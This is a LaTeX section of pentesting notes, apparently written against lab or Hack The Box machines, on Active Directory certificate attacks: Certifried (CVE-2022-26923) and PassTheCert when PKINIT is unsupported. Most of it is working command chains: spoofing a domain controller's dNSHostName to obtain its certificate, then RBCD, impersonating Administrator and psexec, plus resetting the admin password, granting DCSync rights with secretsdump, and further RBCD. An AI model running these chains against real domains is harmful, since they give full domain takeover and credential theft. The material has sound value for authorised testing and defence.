\section{Misc}

\subsection{Certifried (CVE-2022-26923)}

This vulnerability enables domain users to obtain permissions such as Validated write to DNS host name and Validated write to service principal name when creating a computer account. As a result, they can modify the computer account's DNS hostname (dNSHostName) and service principal name (SPN) attributes

Prior to the patch, when computer accounts requested a certificate using the Machine template, the certificate mapping was based on the dNSHostName property value.

Before the update, a constraint error is raised if we try to change the dNSHostName to match another computer account. This was because when the dNSHostName property is edited, the domain controller ensures that the existing SPNs of the account are updated to reflect the new DNS hostname. If the SPNs already exist for another account in Active Directory, the domain controller raises a constraint violation.

To bypass this check and discover the vulnerability, Olivier Lyak performed the following steps:
\begin{itemize}
    \item 
    Clear the SPNs, particularly those corresponding to the dNSHostName value, i.e., the ones with fully-qualified hostnames (e.g., HOST/SRV01.DOMAIN.LOCAL).
    \item 
    Change the dNSHostName to the DNS hostname of the target (e.g., DC.DOMAIN.LOCAL). The constraint violation will not be raised since there are no SPNs to update.
    \item 
    Request a certificate for the spoofed computer account using the Machine template. The Certificate Authority will use the dNSHostName value for identification and issue a certificate for the spoofed machine account.
\end{itemize}

To identify if Certifried is not patched, request a certificate from a standard template (such as the built-in User template) using a user account. If the Certipy output indicates \verb+[*] Certificate has no object SID+, no strong mapping is performed on this ADCS CA.


\begin{verbatim}
ddcomputer.py -computer-name 'CERTIFRIED$' -computer-pass 'Password123!' -dc-ip 10.129.228.134 'LAB.LOCAL/Blwasp':'Password123!'

python3 powerview.py lab.local/BlWasp:'Password123!'@10.129.228.134
PV > Set-DomainObject -Identity 'CERTIFRIED$' -Set dnsHostName="dc02.lab.local"

certipy req -u 'CERTIFRIED$' -p 'Password123!' -dc-ip 10.129.228.134 -ca lab-LAB-DC-CA -template 'Machine'
\end{verbatim}

alternate:
\begin{verbatim}
certipy account create -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.237 -user NEWMACHINE -dns DC02.LAB.LOCAL
certipy req -u 'NEWMACHINE$' -p 'WH98nIn5fE3B4Fq3' -ca lab-LAB-DC-CA -template 'Machine' -dc-ip 10.129.228.237
certipy auth -pfx dc02.pfx -domain lab.local -dc-ip 10.129.228.237
getTGT.py -dc-ip 10.129.228.237 -hashes :046a14f5068624b4f4c760a41b39cd7c "lab.local"/'dc02$'


certipy auth -pfx dc02.pfx -domain lab.local -dc-ip 10.129.228.237 -ldap-shell
set_rbcd dc02$ NEWMACHINE$
getST.py -spn host/DC02.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.228.237 lab.local/'NEWMACHINE$':'WH98nIn5fE3B4Fq3'
export KRB5CCNAME=administrator.ccache
psexec.py -dc-ip 10.129.228.237 -target-ip 10.129.228.237 -no-pass -k dc02.lab.local
\end{verbatim}


\subsection{attacks without PKINIT}
\href{https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html}{Authenticating with certificates when PKINIT is not supported}

Using \href{https://github.com/AlmondOffSec/PassTheCert}{PassTheCert}:
\begin{verbatim}
Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
"KDC has no support for PADATA type (pre-authentication data)"
\end{verbatim}

\begin{verbatim}
certipy cert -pfx administrator.pfx -nokey -out user.crt 
certipy cert -pfx administrator.pfx -nocert -out user.key
\end{verbatim}


\subsubsection{PassTheCert to change password}

\begin{verbatim}

python passthecert.py \
    -action modify_user \
    -crt user.crt -key user.key \
    -domain authority.htb -dc-ip 10.10.11.222 \
    -target administrator -new-pass
\end{verbatim}



\subsubsection{PassTheCert to grant DCSync rights}

\begin{verbatim}
passthecert.py -dc-ip 10.129.229.56 \
    -crt administrator.crt -key administrator-nopass.key \
    -domain authority.htb -port 636 \
    -action modify_user -target blwasp -elevate

secretsdump.py 'authority.htb/blwasp':'Password123!'@10.129.229.56
\end{verbatim}

\subsubsection{PassTheCert to RBCD}

\begin{verbatim}
ython3 passthecert.py -dc-ip 10.129.229.56 \
    -crt administrator.crt -key administrator-nopass.key \
    -domain authority.htb -port 636 \
    -action add_computer -computer-name 'HTB02$' -computer-pass AnotherComputer002

python3 passthecert.py -dc-ip 10.129.229.56 \
    -crt administrator.crt -key administrator-nopass.key \
    -domain authority.htb -port 636 \
    -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HTB02$'

getST.py -spn 'cifs/authority.authority.htb' \
    -impersonate Administrator 'authority.htb/HTB02$:AnotherComputer002'

\end{verbatim}


